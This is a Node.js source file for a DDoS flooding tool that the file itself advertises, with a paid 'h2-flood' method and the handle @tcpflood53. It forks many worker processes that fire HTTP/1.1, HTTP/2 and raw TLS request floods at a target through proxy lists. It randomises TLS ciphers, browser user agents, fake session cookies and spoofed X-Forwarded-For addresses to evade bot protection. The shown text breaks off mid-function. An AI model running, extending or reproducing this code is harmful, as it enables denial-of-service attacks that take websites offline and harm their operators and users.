    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA',
    'TLS_AES_128_CCM_SHA256:TLS_AES_128_CCM_8_SHA256:ECDHE-ECDSA-AES128-CCM:ECDHE-ECDSA-AES256-CCM:ECDHE-ECDSA-AES128-CCM-8:ECDHE-ECDSA-AES256-CCM-8:DHE-RSA-AES128-CCM:DHE-RSA-AES256-CCM:DHE-RSA-AES128-CCM-8:DHE-RSA-AES256-CCM-8',
    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA',
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA',
    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:!DSS',
    'TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256',
    'TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256',
    'TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-256-GCM-SHA384:TLS13-AES-128-GCM-SHA256',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256',
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
    'TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_AES_128_GCM_SHA256'
]));

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
if (process.argv.length < 6) {
    console.log('node robz-priv.js target time rate thread proxy'.white);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "edge", "vivaldi", "yandex", "ucbrowser", "samsungbrowser", "miuibrowser"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const generateUserAgent = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 14, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 },
        edge: { min: 115, max: 124 },
        vivaldi: { min: 5, max: 6 },
        yandex: { min: 22, max: 23 },
        ucbrowser: { min: 12, max: 13 },
        samsungbrowser: { min: 15, max: 18 },
        miuibrowser: { min: 12, max: 14 }
    };
    const version = Math.floor(Math.random() * (versions[browser].max - versions[browser].min + 1)) + versions[browser].min;
    const userAgentMap = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${version}_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version}.0 Safari/605.1.15`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${version}.0) Gecko/20100101 Firefox/${version}.0`,
        mobile: `Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Mobile Safari/537.36`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0.0.0`,
        operagx: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 OPR/${version}.0.0.0`,
        edge: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Edg/${version}.0.0.0`,
        vivaldi: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36 Vivaldi/${version}.0.0.0`,
        yandex: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 YaBrowser/22.${version}.0.0 Safari/537.36`,
        ucbrowser: `Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G975F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/${version}.0.0.0 Mobile Safari/537.36 UCBrowser/12.${version}.0.0`,
        samsungbrowser: `Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/${version}.0 Chrome/91.0.4472.124 Mobile Safari/537.36`,
        miuibrowser: `Mozilla/5.0 (Linux; U; Android 10; zh-cn; MI 9 Build/QKQ1.190825.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/${version}.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/${version}.0.0`
    };
    return userAgentMap[browser];
};

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'ed25519',
    'ed448'
];

const encoding_header = [
    'gzip, deflate, br', 'compress, gzip', 'deflate, gzip', 'gzip, identity',
    'gzip, deflate, br, zstd', 'compress, gzip, deflate, br',
    'deflate, gzip, br', 'gzip, deflate', 'br, gzip, deflate',
    'zstd, gzip, deflate', 'gzip, identity, br', 'deflate, gzip, identity',
    'br, deflate, gzip', 'gzip, br, deflate, *', 'gzip', 'deflate',
    'br', 'zstd', 'identity', 'gzip, deflate, sdch', 'gzip, deflate, lzma',
    'gzip, deflate, lz4', 'gzip, deflate, snappy', 'gzip, deflate, brotli',
    'gzip, deflate, zstd', 'gzip, deflate, br, zstd, lzma',
    'gzip, deflate, br, zstd, lz4', 'gzip, deflate, br, zstd, snappy',
    'gzip, deflate, br, zstd, brotli', 'gzip, deflate, br, zstd',
    'gzip, deflate, br', 'gzip, deflate', 'deflate, gzip',
    'deflate', 'gzip', 'br', 'zstd', 'identity'
];

const fetch_site = ["same-origin", "same-site", "cross-site", "none", "same-origin-allow-popups", "unsafe-url"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors", "websocket"];
const fetch_dest = ["document", "sharedworker", "subresource", "unknown", "worker", "script", "style", "image", "font", "object", "embed", "audio", "video", "track", "iframe", "serviceworker"];

const cookies = [
    '_ga=GA1.2.' + Math.random().toString(36).substr(2, 10) + '.' + Date.now() + '; _gid=GA1.2.' + Math.random().toString(36).substr(2, 10) + '.' + Date.now() + '; _gat=1',
    'sessionid=' + crypto.randomBytes(16).toString('hex') + '; csrftoken=' + crypto.randomBytes(32).toString('hex'),
    'PHPSESSID=' + crypto.randomBytes(26).toString('hex') + '; wordpress_logged_in_' + crypto.randomBytes(8).toString('hex') + '=' + crypto.randomBytes(32).toString('hex'),
    'JSESSIONID=' + crypto.randomBytes(26).toString('hex').toUpperCase() + ';',
    'cf_clearance=' + crypto.randomBytes(40).toString('hex') + '-' + Math.floor(Date.now()/1000) + '-0-250',
    '__cfduid=' + crypto.randomBytes(43).toString('hex') + Math.floor(Date.now()/1000),
    'uid=' + crypto.randomBytes(8).toString('hex') + '; token=' + crypto.randomBytes(32).toString('hex'),
    'login=' + crypto.randomBytes(16).toString('hex') + '; auth=' + crypto.randomBytes(64).toString('hex'),
    'user=' + Math.random().toString(36).substr(2, 10) + '; pass=' + crypto.randomBytes(16).toString('hex'),
    'access_token=' + crypto.randomBytes(128).toString('hex') + '; refresh_token=' + crypto.randomBytes(128).toString('hex'),
    '_gat_gtag_UA_' + Math.floor(Math.random() * 9999999) + '_1=1; _gac_UA-' + Math.floor(Math.random() * 9999999) + '-1=' + Date.now(),
    '__utma=' + Math.floor(Math.random() * 99999999) + '.' + Math.random().toString(36).substr(2, 10) + '.' + Date.now() + '.' + Date.now() + '.' + Date.now() + '.1; __utmb=' + Math.floor(Math.random() * 99999999) + '.' + Date.now() + '.10.' + Date.now() + '; __utmc=' + Math.floor(Math.random() * 99999999) + '; __utmz=' + Math.floor(Math.random() * 99999999) + '.' + Date.now() + '.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmv=' + Math.floor(Math.random() * 99999999) + '.' + Math.random().toString(36).substr(2, 10),
    'NID=' + crypto.randomBytes(100).toString('hex') + '=' + Math.floor(Date.now()/1000),
    '1P_JAR=' + new Date().toISOString() + '-' + Math.random().toString(36).substr(2, 10) + ';',
    'CONSENT=YES+' + Math.floor(Math.random() * 100) + '.en+' + crypto.randomBytes(4).toString('hex') + ';',
    'DV=' + crypto.randomBytes(20).toString('hex') + ';',
    'SID=' + crypto.randomBytes(50).toString('hex') + '; HSID=' + crypto.randomBytes(20).toString('hex') + '; SSID=' + crypto.randomBytes(20).toString('hex') + '; APISID=' + crypto.randomBytes(20).toString('hex') + '; SAPISID=' + crypto.randomBytes(20).toString('hex') + ';',
    'OGPC=' + crypto.randomBytes(20).toString('hex') + ';',
    'OTZ=' + Math.floor(Math.random() * 999999) + ';',
    'S=' + crypto.randomBytes(10).toString('hex') + ';',
    'DSID=' + crypto.randomBytes(20).toString('hex') + ';',
    'AEC=' + crypto.randomBytes(20).toString('hex') + ';',
    '__Secure-3PSID=' + crypto.randomBytes(50).toString('hex') + '; __Secure-3PAPISID=' + crypto.randomBytes(20).toString('hex') + ';',
    '__Secure-3PSIDCC=' + crypto.randomBytes(50).toString('hex') + ';'
];

const methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS', 'TRACE', 'CONNECT'];
const httpVersions = ['HTTP/1.0', 'HTTP/1.1', 'HTTP/2.0', 'HTTP/3'];

let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448:secp256k1:brainpoolP256r1:brainpoolP384r1:brainpoolP512r1";
const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
    crypto.constants.SSL_OP_ALLOW_NO_DHE_KEX |
    crypto.constants.SSL_OP_PREFER_NO_DHE_KEX |
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_IGNORE_UNEXPECTED_EOF |
    crypto.constants.SSL_OP_NO_ANTI_REPLAY |
    crypto.constants.SSL_OP_NO_COMPRESSION |
    crypto.constants.SSL_OP_NO_TICKET;

const secureProtocols = ["TLS_client_method", "TLSv1_2_method", "TLSv1_1_method", "TLS_method", "SSLv23_method"];
const secureProtocol = secureProtocols[Math.floor(Math.random() * secureProtocols.length)];

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol,
    ecdhCurve: ecdhCurve,
    maxVersion: 'TLSv1.2',
    minVersion: 'TLSv1.2'
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

function readLines(filePath) {
    try {
        const data = fs.readFileSync(filePath, "utf-8");
        const lines = data.toString().split(/\r?\n/).filter(line => line.trim().length > 0);
        return lines;
    } catch (error) {
        console.log(`[-] Error reading proxy file: ${error.message}`);
        return [];
    }
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const targetURL = parsedTarget.host;
const MAX_RAM_PERCENTAGE = 90;
const RESTART_DELAY = 1000;
colors.enable();

const coloredString = "Recommended big proxyfile premium if hard target.\n >  Only support HTTP/1.1 and HTTP/2.\n >  Buy Methods h2-flood for @tcpflood53.".white;

if (cluster.isMaster) {
    console.clear();
    console.log(`[!] @tcpflood53 - ULTRA GACOR VERSION`.red);
    console.log(`--------------------------------------------`.white);
    console.log("[>] Heap Size:".green, (v8.getHeapStatistics().heap_size_limit / (1024 * 1024)).toString().white);
    console.log('[>] Target: '.white + process.argv[2].cyan);
    console.log('[>] Time: '.white + process.argv[3].cyan);
    console.log('[>] Rate: '.white + process.argv[4].cyan);
    console.log('[>] Thread(s): '.white + process.argv[5].cyan);
    console.log(`[>] ProxyFile: ${args.proxyFile.cyan} | Total: ${proxies.length.toString().cyan}`);
    console.log("[>] Note: ".white + coloredString);
    console.log(`--------------------------------------------`.white);
    
    getIPAndISP(targetURL);
    
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads * 20; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };
    
    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
    
    setInterval(handleRAMUsage, 3000);
    
    for (let counter = 1; counter <= args.threads * 20; counter++) {
        cluster.fork();
    }
} else {
    // ULTRA MEGA HYPER FLOODER ENGINE
    const attackIntervals = [];
    const MAX_CONCURRENT_ATTACKS = 200;
    
    // Create 200 attack threads with different intervals
    for (let i = 0; i < MAX_CONCURRENT_ATTACKS; i++) {
        attackIntervals.push(setInterval(() => {
            for (let j = 0; j < Math.max(1, Math.floor(args.Rate / 5)); j++) {
                runHyperFlooder();
            }
        }, Math.max(1, Math.floor(Math.random() * 10))));
    }
    
    // Additional burst threads for HTTP/1.1
    for (let i = 0; i < 50; i++) {
        attackIntervals.push(setInterval(() => {
            for (let j = 0; j < 10; j++) {
                runHTTP1Flooder();
            }
        }, 2));
    }
    
    // TLS direct connection flooder
    for (let i = 0; i < 30; i++) {
        attackIntervals.push(setInterval(() => {
            for (let j = 0; j < 5; j++) {
                runTLSFlooder();
            }
        }, 3));
    }
    
    // Clean up intervals when time's up
    setTimeout(() => {
        attackIntervals.forEach(interval => clearInterval(interval));
        process.exit(0);
    }, args.time * 1000);
}

// Enhanced NetSocket with HTTP/1.1 and HTTP/2 support
class EnhancedNetSocket {
    constructor() {
        this.connectionPool = [];
        this.maxPoolSize = 100;
        this.poolIndex = 0;
    }
    
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nUser-Agent: " + generateUserAgent(getRandomBrowser()) + "\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
            timeout: 10000,
            keepAlive: true,
            keepAliveInitialDelay: 0
        });
        
        connection.setTimeout(10000);
        connection.setKeepAlive(true, 500);
        connection.setNoDelay(true);
        connection.setMaxListeners(0);
        
        connection.on("connect", () => {
            connection.write(buffer);
        });
        
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200") || 
                           response.includes("HTTP/1.0 200") || 
                           response.includes("200 Connection established");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });
        
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        
        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, "error: " + (err.message || "connection error"));
        });
        
        connection.on("end", () => {
            connection.destroy();
        });
    }
    
    HTTP1(options, callback) {
        const payload = "GET " + options.path + " HTTP/1.1\r\n" +
                       "Host: " + options.host + "\r\n" +
                       "User-Agent: " + generateUserAgent(getRandomBrowser()) + "\r\n" +
                       "Accept: " + randomElement(accept_header) + "\r\n" +
                       "Accept-Language: " + randomElement(language_header) + "\r\n" +
                       "Accept-Encoding: " + randomElement(encoding_header) + "\r\n" +
                       "Connection: keep-alive\r\n" +
                       "Upgrade-Insecure-Requests: 1\r\n\r\n";
        
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.proxyHost,
            port: options.proxyPort,
            allowHalfOpen: true,
            writable: true,
            readable: true,
            timeout: 10000
        });
        
        connection.setTimeout(10000);
        connection.setKeepAlive(true, 500);
        connection.setNoDelay(true);
        
        connection.on("connect", () => {
            connection.write(buffer);
        });
        
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            callback(connection, undefined);
        });
        
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        
        connection.on("error", (err) => {
            connection.destroy();
            return callback(undefined, "error: " + (err.message || "connection error"));
        });
    }
}

const Socker = new EnhancedNetSocket();

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return '';
    return elements[randomIntn(0, elements.length - 1)];
}

function generateRandomHeaders() {
    const userAgent = generateUserAgent(getRandomBrowser());
    const ip1 = randomIntn(1, 255);
    const ip2 = randomIntn(1, 255);
    const ip3 = randomIntn(1, 255);
    const ip4 = randomIntn(1, 255);
    
    return {
        ':authority': parsedTarget.host,
        ':method': randomElement(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']),
        ':path': parsedTarget.path || '/',
        ':scheme': 'https',
        
        // Standard headers
        'user-agent': userAgent,
        'accept': randomElement(accept_header),
        'accept-encoding': randomElement(encoding_header),
        'accept-language': randomElement(language_header),
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'upgrade-insecure-requests': '1',
        'dnt': '1',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': randomElement(fetch_dest),
        'sec-fetch-mode': randomElement(fetch_mode),
        'sec-fetch-site': randomElement(fetch_site),
        'sec-fetch-user': '?1',
        'te': 'trailers',
        
        // Custom headers
        'x-requested-with': 'XMLHttpRequest',
        'x-forwarded-for': `${ip1}.${ip2}.${ip3}.${ip4}`,
        'x-real-ip': `${ip1}.${ip2}.${ip3}.${ip4}`,
        'x-forwarded-proto': 'https',
        'x-forwarded-host': parsedTarget.host,
        'x-forwarded-port': '443',
        'x-originating-ip': `${ip1}.${ip2}.${ip3}.${ip4}`,
        'x-remote-ip': `${ip1}.${ip2}.${ip3}.${ip4}`,
        'x-remote-addr': `${ip1}.${ip2}.${ip3}.${ip4}`,
        'x-client-ip': `${ip1}.${ip2}.${ip3}.${ip4}`,
        'x-host': parsedTarget.host,
        'x-scheme': 'https',
        
        // Random headers
        'x-request-id': crypto.randomBytes(16).toString('hex'),
        'x-correlation-id': crypto.randomBytes(16).toString('hex'),
        'x-request-start': `t=${Date.now()}`,
        'x-request-time': Date.now().toString(),
        'x-response-time': Date.now().toString(),
        'x-powered-by': 'Express',
        'x-content-type-options': 'nosniff',
        'x-frame-options': 'SAMEORIGIN',
        'x-xss-protection': '1; mode=block',
        'x-download-options': 'noopen',
        'x-permitted-cross-domain-policies': 'none',
        
        // Cookie
        'cookie': randomElement(cookies),
        
        // Referer
        'referer': `https://www.google.com/search?q=${encodeURIComponent(parsedTarget.host)}`,
        'origin': `${parsedTarget.protocol}//${parsedTarget.host}`,
        
        // Content headers
        'content-type': 'application/x-www-form-urlencoded',
        'content-length': '0',
        
        // Connection
        'connection': 'keep-alive, Upgrade',
        'keep-alive': 'timeout=5, max=1000'
